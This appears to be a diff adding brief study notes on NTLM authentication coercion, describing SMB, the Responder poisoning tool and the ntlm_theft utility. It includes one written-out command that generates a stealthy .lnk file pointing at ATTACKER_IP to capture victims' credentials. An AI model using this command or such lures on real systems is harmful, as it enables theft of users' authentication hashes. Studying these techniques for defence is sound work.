@@ -1,0 +1,10 @@
+Authentication coercion attacks.
+
+SMB : Server Message Block protocol. ( allows clients to communicate with a server )
+
+Responder : A tool that allows us to perform man-in-the-middle attacks by poisoning the responses 
+during NetNTLM authentication, tricking the client into talking to you instead of the actual server they want to connect to.
+
+ntlm_theft : Create documents that require authentification to coerce authentification.
+      python3 ntlm_theft.py -g lnk -s ATTACKER_IP -f stealthy  (creates lnk file) 
+
